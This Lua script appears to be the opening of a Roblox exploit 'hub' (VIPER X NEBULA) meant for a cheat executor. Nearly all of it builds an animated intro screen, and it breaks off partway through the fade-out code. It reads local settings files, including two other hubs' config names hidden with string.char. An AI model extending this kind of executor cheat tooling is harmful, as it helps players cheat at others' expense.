-- A previous copy could set this flag and then stop while waiting for a
-- game-specific object. Clear that stale state so a fixed copy can start.
if _G.ViperRunning then
    warn("[VIPER X NEBULA] Previous instance detected. Se recomienda rejoin si hay comportamiento errático.")
end
_G.ViperRunning = false
_G.__ViperMainOriginalPos = nil

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local TS = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local HS = game:GetService("HttpService")
local ContentProvider = game:GetService("ContentProvider")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer
if not LP then
    local _lpConn
    _lpConn = Players.PlayerAdded:Connect(function(p) LP = p end)
    local _t0 = tick()
    while not LP and tick() - _t0 < 15 do task.wait(0.1) end
    if _lpConn then _lpConn:Disconnect() end
end
if not LP then
    warn("[VIPER X NEBULA] LocalPlayer no disponible en 15s. Abortando.")
    return
end

local pgui = LP:WaitForChild("PlayerGui", 20)
if not pgui then
    warn("[VIPER X NEBULA] PlayerGui no cargó en 20s. Abortando.")
    return
end


-- ================= VIPER X NEBULA CHROME INTRO =================
local INTRO_SOUND_IDS = {
    [1] = "17504881745",
    [2] = "8003103632",
    [3] = "7556198569",
}
local selectedIntroIndex = 1
local playIntroEnabled = true -- default: show the cinematic intro on launch

-- Read startup-only preferences before the intro runs. The full settings loader
-- executes later (after GUI construction), so without this early read the intro
-- toggle would always take effect one launch late.
local function loadEarlyStartupPreferences()
    local env = _G
    pcall(function()
        if type(getgenv) == "function" then
            local resolved = getgenv()
            if type(resolved) == "table" then env = resolved end
        end
    end)

    local candidates = {readfile, syn and syn.readfile, env and env.readfile}
    local readFn
    -- Use pairs because the first candidate may be nil while syn.readfile exists.
    for _, candidate in pairs(candidates) do
        if type(candidate) == "function" then
            readFn = candidate
            break
        end
    end
    if not readFn then return end

    local userId = tostring(LP.UserId)
    local paths = {
        "ViperDuels_" .. userId .. ".json",
        string.char(89, 111, 117, 116, 95) .. userId .. ".json",
        string.char(66, 108, 111, 111, 100, 72, 111, 117, 110, 100, 115, 95) .. userId .. ".json",
    }
    for _, path in ipairs(paths) do
        local okRead, raw = pcall(readFn, path)
        if okRead and type(raw) == "string" then
            local okDecode, data = pcall(function() return HS:JSONDecode(raw) end)
            if okDecode and type(data) == "table" then
                if data.playIntroEnabled ~= nil then
                    playIntroEnabled = data.playIntroEnabled == true
                end
                local savedIntroIndex = tonumber(data.selectedIntroIndex or data.introSoundIndex)
                if savedIntroIndex then
                    selectedIntroIndex = math.clamp(math.floor(savedIntroIndex), 1, 3)
                end
                return
            end
        end
    end
end
loadEarlyStartupPreferences()

function playIntroPreview(index)
    index = math.clamp(tonumber(index) or selectedIntroIndex or 1, 1, 3)
    local sound = Instance.new("Sound")
    sound.Name = "ViperHubIntroPreview"
    sound.SoundId = "rbxassetid://" .. tostring(INTRO_SOUND_IDS[index])
    sound.Volume = 0.8
    sound.Looped = false
    sound.Parent = game:GetService("SoundService")
    pcall(function() sound:Play() end)
    task.delay(6, function() pcall(function() sound:Destroy() end) end)
end

function playIntroAnimation()
    local Tw = game:GetService("TweenService")
    local Sg = game:GetService("StarterGui")
    local pr = game:GetService("Players").LocalPlayer
    local pg = pr:WaitForChild("PlayerGui")
    local D = 3.35
    local LID = "" -- Optional: add your uploaded VIPER logo asset ID here
    
    -- Polished chrome palette inspired by the supplied VANTA reference.
    local Silver1 = Color3.fromRGB(245, 247, 255)
    local Silver2 = Color3.fromRGB(195, 201, 214)
    local Silver3 = Color3.fromRGB(104, 110, 123)
    local Silver4 = Color3.fromRGB(24, 26, 32)

    local INTRO_SOUND_ID = tostring(INTRO_SOUND_IDS[selectedIntroIndex] or INTRO_SOUND_IDS[1])

    local introBlur -- created in the background section below, forward-declared so the skip button can reach it

    local function tn(i, t, st, dr, pr2)
        return Tw:Create(i, TweenInfo.new(t, st, dr), pr2)
    end

    pcall(function() Sg:SetCore("TopbarEnabled", false) end)
    local function uf() pcall(function() Sg:SetCore("TopbarEnabled", true) end) end

    local ex = pg:FindFirstChild("ViperHubCinematicIntro")
    if ex then ex:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "ViperHubCinematicIntro"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 1000
    gui.Parent = pg
    
    local introActive = true
    local skipIntro
    local inputSkipConnection

    -- SKIP INTRO BUTTON - glass pill with shimmering text + animated arrow
    local skipBtn = Instance.new("TextButton", gui)
    skipBtn.Size = UDim2.new(0, 130, 0, 38)
    skipBtn.Position = UDim2.new(1, -160, 0, 20) -- starts off to the right, slides in
    skipBtn.BackgroundColor3 = Color3.fromRGB(232, 236, 245)
    skipBtn.BackgroundTransparency = 0.85
    skipBtn.BorderSizePixel = 0
    skipBtn.Text = "SKIP INTRO"
    skipBtn.TextColor3 = Color3.fromRGB(232, 236, 245)
    skipBtn.TextTransparency = 1 -- hidden, fades/slides in below
    skipBtn.Font = Enum.Font.GothamBold
    skipBtn.TextSize = 13
    skipBtn.ZIndex = 50
    skipBtn.AutoButtonColor = false
    skipBtn.ClipsDescendants = false
    Instance.new("UICorner", skipBtn).CornerRadius = UDim.new(1, 0)

    local skipStroke = Instance.new("UIStroke", skipBtn)
    skipStroke.Color = Color3.fromRGB(232, 236, 245)
    skipStroke.Thickness = 1
    skipStroke.Transparency = 1

    -- shimmering gradient sweep across the text (UIGradient tints TextButton text too)
    local skipShimmer = Instance.new("UIGradient", skipBtn)
    skipShimmer.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(75, 81, 95)),
        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(232, 236, 245)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(232, 236, 245)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(75, 81, 95)),
    })
    skipShimmer.Rotation = 0
    skipShimmer.Offset = Vector2.new(-1, 0)

    -- animated arrow that idly nudges to hint "click me"
    local skipArrow = Instance.new("TextLabel", skipBtn)
    skipArrow.Size = UDim2.new(0, 16, 1, 0)
    skipArrow.Position = UDim2.new(1, -24, 0, 0)
    skipArrow.BackgroundTransparency = 1
    skipArrow.Text = "\226\128\186" -- "›"
    skipArrow.TextColor3 = Color3.fromRGB(232, 236, 245)
    skipArrow.TextTransparency = 1
    skipArrow.Font = Enum.Font.GothamBold
    skipArrow.TextSize = 16
    skipArrow.ZIndex = 51

    local skipHovering = false

    -- continuous shimmer sweep + idle arrow nudge, runs the whole intro
    task.spawn(function()
        local t = 0
        while gui and gui.Parent and introActive do
            task.wait(0.03)
            t = t + 0.03
            local speed = skipHovering and 0.9 or 0.35
            skipShimmer.Offset = Vector2.new(((t * speed) % 2) - 1, 0)
            skipArrow.Position = UDim2.new(1, -24 + math.sin(t * 3) * 3, 0, 0)
        end
    end)

    -- entrance: slide in from the right + fade up, after a short beat
    task.delay(0.4, function()
        tn(skipBtn, 0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out, {
            Position = UDim2.new(1, -145, 0, 20),
            TextTransparency = 0,
            BackgroundTransparency = 0.75,
        }):Play()
        tn(skipStroke, 0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, {Transparency = 0.4}):Play()
        tn(skipArrow, 0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, {TextTransparency = 0.1}):Play()
    end)

    skipBtn.MouseEnter:Connect(function()
        skipHovering = true
        tn(skipBtn, 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {
            BackgroundTransparency = 0.55,
            Position = UDim2.new(1, -148, 0, 20),
        }):Play()
        tn(skipStroke, 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {Transparency = 0.1}):Play()
    end)
    skipBtn.MouseLeave:Connect(function()
        skipHovering = false
        tn(skipBtn, 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {
            BackgroundTransparency = 0.75,
            Position = UDim2.new(1, -145, 0, 20),
        }):Play()
        tn(skipStroke, 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {Transparency = 0.4}):Play()
    end)
    skipBtn.MouseButton1Down:Connect(function()
        tn(skipBtn, 0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {BackgroundTransparency = 0.35}):Play()
    end)
    skipBtn.MouseButton1Up:Connect(function()
        tn(skipBtn, 0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {BackgroundTransparency = 0.55}):Play()
    end)

    -- One shared exit path for the skip pill and screen-wide tap/click.
    skipIntro = function()
        if not introActive then return end
        introActive = false
        if inputSkipConnection then
            inputSkipConnection:Disconnect()
            inputSkipConnection = nil
        end

        -- Fade every visible GUI layer, not just the button, for a clean transition.
        for _, obj in ipairs(gui:GetDescendants()) do
            local goal = {}
            if obj:IsA("GuiObject") then
                goal.BackgroundTransparency = 1
            end
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                goal.TextTransparency = 1
            end
            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
                goal.ImageTransparency = 1
            end
            if obj:IsA("UIStroke") then
                goal.Transparency = 1
            end
            if next(goal) then
                pcall(function()
                    tn(obj, 0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In, goal):Play()
                end)
            end
        end

        if introBlur and introBlur.Parent then
            tn(introBlur, 0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {Size = 0}):Play()
        end
        task.delay(0.23, function()
            pcall(function()
                if introBlur and introBlur.Parent then introBlur:Destroy() end
            end)
            pcall(function()
                if gui and gui.Parent then gui:Destroy() end
            end)
            uf()
        end)
    end
    skipBtn.Activated:Connect(function()
        if skipIntro then skipIntro() end
    end)
    -- Listen globally instead of covering the game with an invisible button: taps
    -- and mouse clicks skip the intro without eating the player's controls.
    inputSkipConnection = UIS.InputBegan:Connect(function(input)
        if not introActive or not skipIntro then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            skipIntro()
        end
    end)

    -- BACKGROUND: real depth-of-field blur on the game world (not a black screen),
    -- plus a light tint frame so the intro text stays readable. Player movement,
    -- camera, and controls are never touched, so you can keep walking/looking
    -- around the whole time the intro plays.
    local Lighting = game:GetService("Lighting")

    local existingBlur = Lighting:FindFirstChild("ViperHubCinematicIntroBlur")
    if existingBlur then existingBlur:Destroy() end

    introBlur = Instance.new("BlurEffect")
    introBlur.Name = "ViperHubCinematicIntroBlur"
    introBlur.Size = 0
    introBlur.Parent = Lighting
    tn(introBlur, 0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {Size = 22}):Play()

    local bgGrad = Instance.new("Frame", gui)
    bgGrad.Size = UDim2.new(1, 0, 1, 0)
    bgGrad.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bgGrad.BackgroundTransparency = 1
    bgGrad.BorderSizePixel = 0
    bgGrad.Active = false -- never blocks clicks or movement, purely cosmetic
    bgGrad.ZIndex = 1
    tn(bgGrad, 0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, {BackgroundTransparency = 0.12}):Play()

    local bgGradEffect = Instance.new("UIGradient", bgGrad)
    bgGradEffect.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 1)),
        ColorSequenceKeypoint.new(0.30, Color3.fromRGB(10, 11, 15)),
        ColorSequenceKeypoint.new(0.60, Color3.fromRGB(20, 21, 26)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(2, 2, 4)),
    })
    bgGradEffect.Rotation = 0
    
    task.spawn(function()
        local breathT = 0
        while gui and gui.Parent and introActive do
            task.wait()
            breathT = breathT + 0.01
            if bgGradEffect and bgGradEffect.Parent then
                bgGradEffect.Rotation = (bgGradEffect.Rotation + 0.15) % 360
            end
            -- gentle breathing on the blur strength so it doesn't feel static
            if introBlur and introBlur.Parent then
                introBlur.Size = 22 + math.sin(breathT) * 2
            end
        end
    end)

    -- BREATHING GLOW OVERLAY
    local glowOverlay = Instance.new("Frame", gui)
    glowOverlay.Size = UDim2.new(1, 0, 1, 0)
    glowOverlay.BackgroundColor3 = Color3.fromRGB(205, 213, 230)
    glowOverlay.BackgroundTransparency = 0.985
    glowOverlay.BorderSizePixel = 0
    glowOverlay.ZIndex = 2
    
    task.spawn(function()
        local breath = 0
        while gui and gui.Parent and introActive do
            task.wait()
            breath = breath + 0.02
            local pulse = 0.95 + math.sin(breath) * 0.03
            glowOverlay.BackgroundTransparency = pulse
        end
    end)

    -- ROTATING SILVER RING (moved further up)
    local ringContainer = Instance.new("Frame", gui)
    ringContainer.Size = UDim2.new(0, 160, 0, 160)
    ringContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    ringContainer.Position = UDim2.new(0.5, 0, 0.39, 0)
    ringContainer.BackgroundTransparency = 1
    ringContainer.ZIndex = 3

    local ring = Instance.new("Frame", ringContainer)
    ring.Size = UDim2.new(1, 0, 1, 0)
    ring.BackgroundTransparency = 1
    ring.BorderSizePixel = 0
    ring.ZIndex = 3
    
    local ringStroke = Instance.new("UIStroke", ring)
    ringStroke.Thickness = 2
    ringStroke.Color = Silver1
    ringStroke.Transparency = 0.7
    ringStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    local ringGrad = Instance.new("UIGradient", ringStroke)
    ringGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Silver1),
        ColorSequenceKeypoint.new(0.25, Silver4),
        ColorSequenceKeypoint.new(0.50, Silver1),
        ColorSequenceKeypoint.new(0.75, Silver4),
        ColorSequenceKeypoint.new(1.00, Silver1),
    })
    ringGrad.Rotation = 0
    
    task.spawn(function()
        while gui and gui.Parent and introActive do
            task.wait()
            if ring then
                ring.Rotation = (ring.Rotation + 1.5) % 360
            end
            if ringGrad and ringGrad.Parent then
                ringGrad.Rotation = (ringGrad.Rotation + 1) % 360
            end
        end
    end)

    -- IMAGE CONTAINER - Smaller, positioned above text
    local imageContainer = Instance.new("Frame", ringContainer)
    imageContainer.Size = UDim2.new(0, 70, 0, 70)
    imageContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    imageContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
    imageContainer.BackgroundTransparency = 1
    imageContainer.BorderSizePixel = 0
    imageContainer.ClipsDescendants = true
    imageContainer.ZIndex = 5
    Instance.new("UICorner", imageContainer).CornerRadius = UDim.new(0, 16)

    imageContainer.Size = UDim2.new(0, 14, 0, 14)
    
    local imageStroke = Instance.new("UIStroke", imageContainer)
    imageStroke.Thickness = 1.5
    imageStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    imageStroke.Color = Silver1
    imageStroke.Transparency = 0.5

    local strokeGrad = Instance.new("UIGradient", imageStroke)
    strokeGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Silver1),
        ColorSequenceKeypoint.new(0.25, Silver3),
        ColorSequenceKeypoint.new(0.50, Silver1),
        ColorSequenceKeypoint.new(0.75, Silver3),
        ColorSequenceKeypoint.new(1.00, Silver1),
    })
    strokeGrad.Rotation = 0

    task.spawn(function()
        while gui and gui.Parent and introActive do
            task.wait()
            if strokeGrad and strokeGrad.Parent then
                strokeGrad.Rotation = (strokeGrad.Rotation + 2) % 360
            end
        end
    end)

    local pumpkinLogo = Instance.new("TextLabel", imageContainer)
    pumpkinLogo.Name = "ViperChromeMonogram"
    pumpkinLogo.Size = UDim2.new(1, -4, 1, -4)
    pumpkinLogo.Position = UDim2.new(0, 2, 0, 2)
    pumpkinLogo.BackgroundTransparency = 1
    pumpkinLogo.Text = "V"
    pumpkinLogo.TextColor3 = Silver1
    pumpkinLogo.Font = Enum.Font.GothamBlack
    pumpkinLogo.TextScaled = true
    pumpkinLogo.TextTransparency = 0
    pumpkinLogo.ZIndex = 6
    local monogramGrad = Instance.new("UIGradient", pumpkinLogo)
    monogramGrad.Rotation = 90
    monogramGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.20, Color3.fromRGB(130, 135, 148)),
        ColorSequenceKeypoint.new(0.42, Color3.fromRGB(38, 40, 47)),
        ColorSequenceKeypoint.new(0.58, Color3.fromRGB(245, 247, 255)),
        ColorSequenceKeypoint.new(0.78, Color3.fromRGB(112, 117, 130)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255)),
    })

    local li = Instance.new("ImageLabel", imageContainer)
    li.Image = LID
    li.Size = UDim2.new(1, -6, 1, -6)
    li.Position = UDim2.new(0, 3, 0, 3)
    li.BackgroundTransparency = 1
    li.ImageTransparency = 1
    li.ScaleType = Enum.ScaleType.Crop
    li.ZIndex = 6
    Instance.new("UICorner", li).CornerRadius = UDim.new(0, 12)

    -- FLOATING SILVER PARTICLES
    local particleContainer = Instance.new("Frame", gui)
    particleContainer.Size = UDim2.new(1, 0, 1, 0)
    particleContainer.BackgroundTransparency = 1
    particleContainer.ZIndex = 4

    -- Floating chrome particles: small silver discs instead of the old Halloween pumpkins.
    local halloweenRain = {}
    local function makePumpkin(parent, index, scale, transparency)
        local root = Instance.new("Frame", parent)
        root.Name = "FloatingChromeParticle" .. index
        root.Size = UDim2.fromOffset(9 * scale, 9 * scale)
        root.BackgroundColor3 = Color3.fromRGB(218, 224, 236)
        root.BackgroundTransparency = transparency
        root.BorderSizePixel = 0
        root.ZIndex = 4
        Instance.new("UICorner", root).CornerRadius = UDim.new(1, 0)
        local shine = Instance.new("UIGradient", root)
        shine.Rotation = 90
        shine.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(0.30, Color3.fromRGB(112, 118, 132)),
            ColorSequenceKeypoint.new(0.52, Color3.fromRGB(245, 247, 255)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(70, 75, 88)),
        })
        return root
    end

    for i = 1, 18 do
        local scale = math.random(65, 140) / 100
        local deco = makePumpkin(particleContainer, i, scale, 0.28 + math.random() * 0.42)
        deco.Position = UDim2.new(math.random(), 0, math.random(), 0)
        table.insert(halloweenRain, {
            frame = deco,
            speed = 0.0007 + math.random() * 0.0018,
            drift = (math.random() - 0.5) * 0.0012,
            phase = math.random() * math.pi * 2,
        })
    end
    task.spawn(function()
        local rainTime = 0
        while gui and gui.Parent and introActive do
            task.wait(0.025)
            rainTime += 0.025
            for _, p in ipairs(halloweenRain) do
                local obj = p.frame
                if obj and obj.Parent then
                    local x = obj.Position.X.Scale + p.drift + math.sin(rainTime + p.phase) * 0.00025
                    local y = obj.Position.Y.Scale + p.speed
                    if y > 1.08 then
                        y = -0.08
                        x = math.random()
                    end
                    if x > 1.05 then x = -0.05 end
                    if x < -0.05 then x = 1.05 end
                    obj.Position = UDim2.new(x, 0, y, 0)
                end
            end
        end
    end)

    -- Background motion is limited to the slow floating chrome particles above.
    local particles = {}

    -- CIRCULAR LOADING RING (smaller, positioned below text)
    local loadingRing = Instance.new("Frame", gui)
    loadingRing.Size = UDim2.new(0, 45, 0, 45)
    loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
    loadingRing.Position = UDim2.new(0.5, 0, 0.78, 0)
    loadingRing.BackgroundTransparency = 1
    loadingRing.ZIndex = 5

    local ringArc = Instance.new("Frame", loadingRing)
    ringArc.Size = UDim2.new(1, 0, 1, 0)
    ringArc.BackgroundTransparency = 1
    ringArc.BorderSizePixel = 0
    ringArc.Rotation = -90
    ringArc.ZIndex = 5

    local arcStroke = Instance.new("UIStroke", ringArc)
    arcStroke.Thickness = 2.5
    arcStroke.Color = Silver2
    arcStroke.Transparency = 0.8
    arcStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    local arcGrad = Instance.new("UIGradient", arcStroke)
    arcGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Silver1),
        ColorSequenceKeypoint.new(0.50, Silver3),
        ColorSequenceKeypoint.new(1.00, Silver1),
    })
    arcGrad.Rotation = 0
    arcGrad.Offset = Vector2.new(-0.5, 0)

    -- Circular progress text (smaller)
    local progressText = Instance.new("TextLabel", gui)
    progressText.Size = UDim2.new(0, 60, 0, 20)
    progressText.AnchorPoint = Vector2.new(0.5, 0.5)
    progressText.Position = UDim2.new(0.5, 0, 0.86, 0)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Silver2
    progressText.Font = Enum.Font.GothamMedium
    progressText.TextSize = 12
    progressText.ZIndex = 5

    -- METALLIC SHIMMER ON TEXT
    local function bw(word, yp, tc, sz, sp)
        local co = Instance.new("Frame", gui)
        co.Size = UDim2.new(1, 0, 0, sz + 10)
        co.Position = UDim2.new(0, 0, yp, 0)
        co.BackgroundTransparency = 1
        co.ZIndex = 5

        local lo = Instance.new("UIListLayout", co)
        lo.FillDirection = Enum.FillDirection.Horizontal
        lo.HorizontalAlignment = Enum.HorizontalAlignment.Center
        lo.VerticalAlignment = Enum.VerticalAlignment.Center
        lo.Padding = UDim.new(0, sp or 2)
        lo.SortOrder = Enum.SortOrder.LayoutOrder

        local le = {}
        for i = 1, #word do
            local ch = word:sub(i, i)
            local lb = Instance.new("TextLabel", co)
            lb.LayoutOrder = i
            lb.Size = UDim2.new(0, sz * 0.65, 0, sz)
            lb.BackgroundTransparency = 1
            lb.Text = ch
            lb.TextColor3 = tc
            lb.Font = Enum.Font.GothamBlack
            lb.TextScaled = true
            lb.TextTransparency = 1
            lb.ZIndex = 5
            local letterStroke = Instance.new("UIStroke", lb)
            letterStroke.Color = Color3.fromRGB(32, 35, 42)
            letterStroke.Thickness = 1.35
            letterStroke.Transparency = 0.08

            local grad = Instance.new("UIGradient", lb)
            grad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
                ColorSequenceKeypoint.new(0.12, Color3.fromRGB(158, 164, 177)),
                ColorSequenceKeypoint.new(0.28, Color3.fromRGB(49, 52, 61)),
                ColorSequenceKeypoint.new(0.43, Color3.fromRGB(244, 246, 253)),
                ColorSequenceKeypoint.new(0.56, Color3.fromRGB(102, 108, 121)),
                ColorSequenceKeypoint.new(0.72, Color3.fromRGB(235, 238, 247)),
                ColorSequenceKeypoint.new(0.86, Color3.fromRGB(116, 122, 136)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255)),
            })
            grad.Rotation = 90
            grad.Offset = Vector2.new(-0.8, 0)

            local ar = Instance.new("UIAspectRatioConstraint", lb)
            ar.AspectRatio = 0.72

            le[i] = lb
        end
        return co, le
    end

    local fc, fl = bw("VIPER", 0.085, Silver1, 76, 1)
    local dc, dl = nil, {} -- single-line VIPER title; no overlapping second word

    -- Static metallic title finish: no side-sweeping line/shimmer animation.
    for _, letter in ipairs(fl) do
        local grad = letter:FindFirstChildOfClass("UIGradient")
        if grad then grad.Offset = Vector2.new(0, 0) end
    end

    -- Thin chrome divider under the VIPER wordmark, like the supplied reference.
    local dividerGlow = Instance.new("Frame", gui)
    dividerGlow.Name = "VIPERDividerGlow"
    dividerGlow.AnchorPoint = Vector2.new(0.5, 0)
    dividerGlow.Position = UDim2.new(0.5, 0, 0.195, 0)
    dividerGlow.Size = UDim2.new(0.86, 0, 0, 4)
    dividerGlow.BackgroundColor3 = Silver2
    dividerGlow.BackgroundTransparency = 1
    dividerGlow.BorderSizePixel = 0
    dividerGlow.ZIndex = 5
    local dividerGlowGrad = Instance.new("UIGradient", dividerGlow)
    dividerGlowGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.18, Color3.fromRGB(130, 136, 150)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.82, Color3.fromRGB(130, 136, 150)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0)),
    })
    local dividerLine = Instance.new("Frame", gui)
    dividerLine.Name = "VIPERDividerLine"
    dividerLine.AnchorPoint = Vector2.new(0.5, 0)
    dividerLine.Position = UDim2.new(0.5, 0, 0.195, 0)
    dividerLine.Size = UDim2.new(0.86, 0, 0, 1)
    dividerLine.BackgroundColor3 = Color3.fromRGB(210, 216, 228)
    dividerLine.BackgroundTransparency = 1
    dividerLine.BorderSizePixel = 0
    dividerLine.ZIndex = 6
    local dividerGrad = Instance.new("UIGradient", dividerLine)
    dividerGrad.Color = dividerGlowGrad.Color

    -- Small hint lets players discover that the whole screen is tappable.
    local tapHint = Instance.new("TextLabel", gui)
    tapHint.Name = "TapAnywhereHint"
    tapHint.AnchorPoint = Vector2.new(0.5, 0.5)
    tapHint.Size = UDim2.new(0, 280, 0, 20)
    tapHint.Position = UDim2.new(0.5, 0, 0.94, 0)
    tapHint.BackgroundTransparency = 1
    tapHint.Text = "TAP ANYWHERE TO SKIP"
    tapHint.TextColor3 = Color3.fromRGB(190, 196, 208)
    tapHint.TextTransparency = 1
    tapHint.Font = Enum.Font.GothamMedium
    tapHint.TextSize = 10
    tapHint.ZIndex = 39
    tapHint.Active = false

    -- Play intro sound
    local introSound
    task.spawn(function()
        pcall(function()
            introSound = Instance.new("Sound")
            introSound.SoundId = "rbxassetid://" .. INTRO_SOUND_ID
            introSound.Volume = 0.7
            introSound.Parent = gui
            introSound:Play()
        end)
    end)

    -- ============================================================
    -- ANIMATION SEQUENCE (FASTER)
    -- ============================================================

    -- CAMERA SHAKE (subtle, shorter)
    task.spawn(function()
        local shake = 0
        while gui and gui.Parent and introActive and shake < 20 do
            task.wait(0.016)
            shake = shake + 1
            if shake < 12 then
                local intensity = 1.5 * (1 - shake/12)
                ringContainer.Position = UDim2.new(
                    0.5 + (math.random() - 0.5) * intensity * 0.001,
                    (math.random() - 0.5) * intensity * 0.5,
                    0.25 + (math.random() - 0.5) * intensity * 0.001,
                    (math.random() - 0.5) * intensity * 0.5
                )
            else
                ringContainer.Position = UDim2.new(0.5, 0, 0.39, 0)
            end
        end
    end)

    -- Cinematic logo scale: 0.2 -> 1.15 -> 1.0 (faster)
    task.delay(0.05, function()
        tn(imageContainer, 0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out, {
            Size = UDim2.new(0, 82, 0, 82)
        }):Play()
    end)
    task.delay(0.7, function()
        tn(imageContainer, 0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out, {
            Size = UDim2.new(0, 70, 0, 70)
        }):Play()
    end)

    -- Logo fade in
    if LID ~= "" then
        tn(li, 0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, {ImageTransparency = 0}):Play()
    end
    tn(imageStroke, 0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, {Transparency = 0.2}):Play()

    -- FICTION letter cascade (faster)
    task.delay(0.15, function()
        for i, lt in ipairs(fl) do
            task.delay((i - 1) * 0.025, function()
                lt.Position = UDim2.new(0, 0, 0.3, 0)
                tn(lt, 0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out,
                    {TextTransparency = 0, Position = UDim2.new(0, 0, 0, 0)}):Play()
            end)
        end
    end)

    -- DUELS letter cascade (faster)
    task.delay(0.35, function()
        for i, lt in ipairs(dl) do
            task.delay((i - 1) * 0.025, function()
                lt.Position = UDim2.new(0, 0, -0.3, 0)
                tn(lt, 0.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out,
                    {TextTransparency = 0.1, Position = UDim2.new(0, 0, 0, 0)}):Play()
            end)
        end
    end)

    task.delay(0.55, function()
        if not introActive then return end
        tn(dividerGlow, 0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, {BackgroundTransparency = 0.82}):Play()
        tn(dividerLine, 0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, {BackgroundTransparency = 0.18}):Play()
    end)
    task.delay(0.9, function()
        if not introActive then return end
        tn(tapHint, 0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out, {TextTransparency = 0.2}):Play()
    end)
    task.spawn(function()
        local hintT = 0
        while gui and gui.Parent and introActive do
            task.wait(0.04)
            hintT += 0.04
            if tapHint and tapHint.Parent then
                tapHint.TextTransparency = 0.16 + (math.sin(hintT * 2.4) + 1) * 0.09
            end
        end
    end)

    -- Circular loading ring animation (faster)
    task.delay(0.6, function()
        local duration = 1.8
        local steps = 40
        local startTime = tick()
        task.spawn(function()
            while gui and gui.Parent and introActive do
                local elapsed = tick() - startTime
                local progress = math.min(elapsed / duration, 1)
                local angle = progress * 360
                ringArc.Rotation = -90 + angle
                progressText.Text = math.floor(progress * 100) .. "%"
                arcStroke.Transparency = 0.2 + (1 - progress) * 0.6
                if progress >= 1 then break end
                task.wait(0.04)
            end
            progressText.Text = "100%"
            arcStroke.Transparency = 0.2
        end)
    end)

    -- Cinematic fade-out (faster)
    task.delay(2.8, function()
        if not introActive then return end
        local ot = 0.4
        for _, lt in ipairs(fl) do tn(lt, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {TextTransparency = 1}):Play() end
        for _, lt in ipairs(dl) do tn(lt, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {TextTransparency = 1}):Play() end
        tn(li, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {ImageTransparency = 1}):Play()
        tn(imageStroke, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {Transparency = 1}):Play()
        tn(ring, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {BackgroundTransparency = 1}):Play()
        tn(ringStroke, ot, Enum.EasingStyle.Quad, Enum.EasingDirection.In, {Transparency = 1}):Play()
